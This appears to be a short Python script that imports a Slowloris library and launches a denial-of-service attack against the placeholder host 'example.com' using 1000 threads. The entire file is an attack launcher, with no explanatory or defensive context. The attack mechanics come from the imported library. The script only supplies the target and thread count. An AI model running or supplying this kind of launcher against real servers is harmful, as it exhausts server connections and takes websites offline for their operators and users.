from slowloris import Slowloris

NUM_OF_THREADS = 1000

slowloris = Slowloris("example.com")
slowloris.attack(NUM_OF_THREADS)
